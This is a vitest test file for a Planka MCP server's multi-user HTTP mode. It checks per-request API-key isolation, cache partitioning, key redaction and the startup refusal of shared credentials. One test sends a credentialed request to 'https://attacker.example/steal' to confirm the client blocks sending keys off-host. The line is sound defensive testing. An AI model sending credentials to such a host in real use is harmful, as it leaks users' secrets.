/**
 * Multi-user HTTP mode: one process, many Planka users, no shared state.
 *
 * These tests run the real server (real singleton client, real tool handlers,
 * real SDK transport) on an ephemeral port, with only the network to Planka
 * replaced: a fetch stub that answers per X-Api-Key, as Planka would.
 */
import type { AddressInfo } from "node:net";
import type { Server } from "node:http";
import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  it,
  vi,
} from "vitest";
import {
  ENV_CREDENTIAL_VARS,
  PlankaClient,
  getConfig,
  getHttpConfig,
  plankaClient,
} from "../../src/client.js";
import { PlankaAuthError, PlankaConfigError } from "../../src/errors.js";
import { MAX_BODY_BYTES, startHttpServer } from "../../src/http.js";
import {
  boardNamesCacheKeys,
  clearBoardNamesCache,
  getBoardNames,
} from "../../src/operations/cards.js";
import { fingerprintKey, runWithApiKey } from "../../src/request-context.js";
import { resolveTransport } from "../../src/transport-mode.js";

const PLANKA = "https://planka.test";
const ALICE = "alice_0000000000000000secret";
const BOB = "bob_11111111111111111secret";
const LEAKY = "leaky_222222222222222secret";

const USERS: Record<string, string> = { [ALICE]: "Alice", [BOB]: "Bob", [LEAKY]: "Leaky" };

const realFetch = globalThis.fetch;
/** Every request that reached "Planka": which key, which path, which headers. */
const plankaCalls: Array<{ key: string | null; path: string; headers: Headers }> = [];

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
const json = (body: unknown, status = 200) =>
  new Response(JSON.stringify(body), {
    status,
    headers: { "Content-Type": "application/json" },
  });

/** A Planka that answers as whichever user the X-Api-Key belongs to. */
async function fakePlanka(url: string, init?: RequestInit): Promise<Response> {
  const headers = new Headers(init?.headers);
  const key = headers.get("x-api-key");
  const path = new URL(url).pathname;
  plankaCalls.push({ key, path, headers });

  // Random latency, so concurrent requests genuinely interleave.
  await sleep(Math.random() * 15);

  const who = key ? USERS[key] : undefined;
  if (!who) return json({ code: "E_UNAUTHORIZED", message: "Access token is missing" }, 401);

  if (key === LEAKY) {
    // An error body that echoes the request back, key included.
    return json({ code: "E_BAD", message: `Bad request with x-api-key: ${key}` }, 400);
  }
  if (path === "/api/users/me") {
    return json({
      item: { id: `u-${who}`, name: who, username: who.toLowerCase(), createdAt: "2026-01-01T00:00:00.000Z" },
    });
  }
  if (path === "/api/bootstrap") return json({ item: { version: "2.0.0" } });
  if (path === "/api/boards/b1") {
    return json({
      item: { id: "b1", projectId: "p1", name: "Shared board" },
      included: {
        lists: [{ id: "l1", name: `${who}'s list` }],
        labels: [{ id: "lab1", name: `${who}'s label` }],
        customFields: [],
      },
    });
  }
  return json({ code: "E_NOT_FOUND", message: "Not found" }, 404);
}

let server: Server;
let base: string;

async function post(body: unknown, key?: string, extraHeaders: Record<string, string> = {}) {
  const response = await realFetch(`${base}/mcp`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json, text/event-stream",
      ...(key ? { "X-Api-Key": key } : {}),
      ...extraHeaders,
    },
    body: typeof body === "string" ? body : JSON.stringify(body),
  });
  const text = await response.text();
  return { status: response.status, body: text ? JSON.parse(text) : null };
}

const initialize = (id = 1) => ({
  jsonrpc: "2.0",
  id,
  method: "initialize",
  params: {
    protocolVersion: "2025-06-18",
    capabilities: {},
    clientInfo: { name: "test", version: "0" },
  },
});
const listTools = (id = 2) => ({ jsonrpc: "2.0", id, method: "tools/list" });
const callTool = (id: number, name: string, args: Record<string, unknown> = {}) => ({
  jsonrpc: "2.0",
  id,
  method: "tools/call",
  params: { name, arguments: args },
});

const savedEnv: Record<string, string | undefined> = {};

beforeAll(async () => {
  for (const name of [...ENV_CREDENTIAL_VARS, "PLANKA_BASE_URL"]) {
    savedEnv[name] = process.env[name];
    delete process.env[name];
  }
  process.env.PLANKA_BASE_URL = PLANKA;

  vi.stubGlobal("fetch", (input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input instanceof Request ? input.url : input);
    return url.startsWith(PLANKA) ? fakePlanka(url, init) : realFetch(input, init);
  });

  server = await startHttpServer({ host: "127.0.0.1", port: 0 });
  base = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
});

afterAll(async () => {
  await new Promise((resolve) => server.close(resolve));
  vi.unstubAllGlobals();
  for (const [name, value] of Object.entries(savedEnv)) {
    if (value === undefined) delete process.env[name];
    else process.env[name] = value;
  }
});

beforeEach(() => {
  plankaCalls.length = 0;
  clearBoardNamesCache();
});

afterEach(() => {
  vi.restoreAllMocks();
});

describe("HTTP routes", () => {
  it("GET /healthz answers 200 without touching Planka", async () => {
    const response = await realFetch(`${base}/healthz`);
    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({ status: "ok" });
    expect(plankaCalls).toHaveLength(0);
  });

  it("answers 404 for every other path", async () => {
    for (const path of ["/", "/mcp/extra", "/health", "/api/users/me"]) {
      const response = await realFetch(`${base}${path}`, {
        headers: { "X-Api-Key": ALICE },
      });
      expect(response.status, path).toBe(404);
    }
    expect(plankaCalls).toHaveLength(0);
  });

  it("answers 405 to GET/DELETE on /mcp (stateless: no stream, no session)", async () => {
    for (const method of ["GET", "DELETE"]) {
      const response = await realFetch(`${base}/mcp`, {
        method,
        headers: { "X-Api-Key": ALICE },
      });
      expect(response.status, method).toBe(405);
    }
  });

  it("rejects a body over the limit with 413", async () => {
    const huge = JSON.stringify({ ...initialize(), padding: "x".repeat(MAX_BODY_BYTES) });
    const { status, body } = await post(huge, ALICE);
    expect(status).toBe(413);
    expect(body.error.code).toBe(-32600);
  });

  it("rejects malformed JSON with a JSON-RPC parse error", async () => {
    const { status, body } = await post("{not json", ALICE);
    expect(status).toBe(400);
    expect(body.error.code).toBe(-32700);
  });
});

describe("authentication", () => {
  it("answers 401 with a JSON-RPC error when X-Api-Key is missing", async () => {
    for (const message of [initialize(), listTools(), callTool(3, "planka_whoami")]) {
      const { status, body } = await post(message);
      expect(status).toBe(401);
      expect(body).toMatchObject({
        jsonrpc: "2.0",
        id: null,
        error: { code: -32001, message: expect.stringMatching(/X-Api-Key/) },
      });
    }
    // Refused before any tool ran: Planka never heard of it.
    expect(plankaCalls).toHaveLength(0);
  });

  it("treats an empty X-Api-Key as missing", async () => {
    const { status } = await post(listTools(), "   ");
    expect(status).toBe(401);
  });

  it("serves initialize and tools/list with a key", async () => {
    const init = await post(initialize(), ALICE);
    expect(init.status).toBe(200);
    expect(init.body.result.serverInfo.name).toBeTruthy();
    expect(init.body.result.instructions).toBeTruthy();

    const tools = await post(listTools(), ALICE);
    expect(tools.status).toBe(200);
    const names = tools.body.result.tools.map((t: { name: string }) => t.name);
    expect(names).toContain("planka_whoami");
  });

  it("reads the header case-insensitively", async () => {
    const { status } = await post(listTools(), undefined, { "x-API-key": ALICE });
    expect(status).toBe(200);
  });

  it("never falls back to anything when called outside a request", async () => {
    await expect(plankaClient.get("/api/users/me")).rejects.toBeInstanceOf(PlankaAuthError);
    expect(plankaCalls).toHaveLength(0);
  });

  it("reports a key Planka rejects without echoing it", async () => {
    const unknown = "nobody_9999999999999999secret";
    const { body } = await post(callTool(4, "planka_whoami"), unknown);
    const text = body.result.content[0].text as string;
    expect(body.result.isError).toBe(true);
    expect(text).toMatch(/rejected the API key/);
    expect(text).not.toContain(unknown);
    expect(JSON.stringify(body)).not.toContain(unknown);
  });
});

describe("isolation between users", () => {
  it("interleaved concurrent requests each see only their own Planka", async () => {
    const order = Array.from({ length: 24 }, (_, i) => (i % 2 === 0 ? ALICE : BOB));
    const results = await Promise.all(
      order.map((key, i) => post(callTool(100 + i, "planka_whoami"), key))
    );

    results.forEach((result, i) => {
      expect(result.status).toBe(200);
      const payload = JSON.parse(result.body.result.content[0].text);
      expect(payload.user.name).toBe(USERS[order[i]]);
      expect(payload.authMode).toBe("apiKey");
    });

    // Every call to Planka carried a real caller's key and nothing else.
    expect(plankaCalls.length).toBeGreaterThanOrEqual(order.length * 2);
    for (const call of plankaCalls) {
      expect([ALICE, BOB]).toContain(call.key);
      expect(call.headers.get("authorization")).toBeNull();
      expect(call.headers.get("cookie")).toBeNull();
    }
    expect(plankaCalls.filter((c) => c.key === ALICE).length).toBe(
      plankaCalls.filter((c) => c.key === BOB).length
    );
  });

  it("does not share the board-names cache between keys", async () => {
    const alice1 = await runWithApiKey(ALICE, () => getBoardNames("b1"));
    const bob1 = await runWithApiKey(BOB, () => getBoardNames("b1"));
    const alice2 = await runWithApiKey(ALICE, () => getBoardNames("b1"));

    expect(alice1?.lists.get("l1")).toBe("Alice's list");
    expect(bob1?.lists.get("l1")).toBe("Bob's list");
    expect(alice2?.lists.get("l1")).toBe("Alice's list");

    // Alice's second read was a cache hit; Bob's first was not.
    const boardReads = plankaCalls.filter((c) => c.path === "/api/boards/b1");
    expect(boardReads.map((c) => c.key)).toEqual([ALICE, BOB]);

    // Partitioned by a hash of the key, never the key itself.
    const keys = boardNamesCacheKeys();
    expect(keys.sort()).toEqual(
      [`${fingerprintKey(ALICE)}:b1`, `${fingerprintKey(BOB)}:b1`].sort()
    );
    for (const key of keys) {
      expect(key).not.toContain(ALICE);
      expect(key).not.toContain(BOB);
    }
  });

  it("keeps the cache partitioned under concurrency too", async () => {
    const reads = await Promise.all(
      Array.from({ length: 10 }, (_, i) => {
        const key = i % 2 === 0 ? ALICE : BOB;
        return runWithApiKey(key, async () => ({
          key,
          names: await getBoardNames("b1"),
        }));
      })
    );
    for (const { key, names } of reads) {
      expect(names?.lists.get("l1")).toBe(`${USERS[key]}'s list`);
    }
  });
});

describe("the key never leaks", () => {
  it("scrubs a Planka error body that echoes the key out of the tool result", async () => {
    const errors = vi.spyOn(console, "error").mockImplementation(() => {});
    const { body } = await post(callTool(5, "planka_whoami"), LEAKY);
    const text = body.result.content[0].text as string;

    expect(body.result.isError).toBe(true);
    expect(text).toContain("[redacted]");
    expect(JSON.stringify(body)).not.toContain(LEAKY);
    for (const call of errors.mock.calls) {
      expect(call.map(String).join(" ")).not.toContain(LEAKY);
    }
  });

  it("never sends credentials to a host other than Planka's", async () => {
    await runWithApiKey(ALICE, async () => {
      await expect(
        plankaClient.getBinary("https://attacker.example/steal")
      ).rejects.toThrow(/never sent to another host/);
    });
    expect(plankaCalls).toHaveLength(0);
  });

  it("re-roots a Planka attachment URL from another origin onto PLANKA_BASE_URL", async () => {
    await runWithApiKey(ALICE, async () => {
      await plankaClient
        .getBinary("https://board.public.example/attachments/9/download/a.png")
        .catch(() => undefined); // the fake answers 404; only the target matters
    });
    expect(plankaCalls.map((c) => c.path)).toEqual(["/attachments/9/download/a.png"]);
  });
});

describe("startup refuses shared credentials", () => {
  it.each([
    ["PLANKA_API_KEY", "shared_key_value"],
    ["PLANKA_AGENT_EMAIL", "agent@example.com"],
    ["PLANKA_AGENT_PASSWORD", "hunter2hunter2"],
  ])("refuses to start with %s set", async (name, value) => {
    const env = { PLANKA_BASE_URL: PLANKA, [name]: value };
    expect(() => getHttpConfig(env)).toThrow(PlankaConfigError);
    expect(() => getHttpConfig(env)).toThrow(new RegExp(name));
    expect(() => new PlankaClient(env).useRequestScopedKeys()).toThrow(name);

    // And the real entry point does not bind a port.
    process.env[name] = value;
    try {
      await expect(startHttpServer({ host: "127.0.0.1", port: 0 })).rejects.toThrow(name);
    } finally {
      delete process.env[name];
    }
    // The running instance is still request-scoped, still serving.
    expect((await post(listTools(), ALICE)).status).toBe(200);
  });

  it("still requires PLANKA_BASE_URL", () => {
    expect(() => getHttpConfig({})).toThrow(/PLANKA_BASE_URL/);
    expect(() => getHttpConfig({ PLANKA_BASE_URL: "not a url" })).toThrow(/Invalid/);
  });

  it("ignores credential variables that are set but empty", () => {
    expect(getHttpConfig({ PLANKA_BASE_URL: `${PLANKA}/`, PLANKA_API_KEY: " " })).toEqual({
      baseUrl: PLANKA,
    });
  });
});

describe("stdio mode is unchanged", () => {
  it("is the default transport", () => {
    expect(resolveTransport([], {})).toBe("stdio");
    expect(resolveTransport([], { MCP_TRANSPORT: "stdio" })).toBe("stdio");
    expect(resolveTransport([], { MCP_TRANSPORT: "HTTP" })).toBe("http");
    expect(resolveTransport(["--http"], {})).toBe("http");
    expect(() => resolveTransport([], { MCP_TRANSPORT: "sse" })).toThrow(/MCP_TRANSPORT/);
  });

  it("still authenticates with the environment key", async () => {
    const seen: Array<string | null> = [];
    const client = new PlankaClient(
      { PLANKA_BASE_URL: PLANKA, PLANKA_API_KEY: "env_key_000000000" },
      (async (_url: RequestInfo | URL, init?: RequestInit) => {
        seen.push(new Headers(init?.headers).get("x-api-key"));
        return json({ items: [] });
      }) as typeof fetch
    );
    await client.get("/api/projects");
    expect(seen).toEqual(["env_key_000000000"]);
  });

  it("still requires environment credentials", () => {
    expect(() => getConfig({ PLANKA_BASE_URL: PLANKA })).toThrow(/PLANKA_API_KEY/);
  });

  it("scrubs the environment key in stdio mode", async () => {
    const client = new PlankaClient(
      { PLANKA_BASE_URL: PLANKA, PLANKA_API_KEY: "env_key_000000000" },
      (async () => json({ items: [] })) as typeof fetch
    );
    expect(client.secrets()).toEqual(["env_key_000000000"]);
  });
});
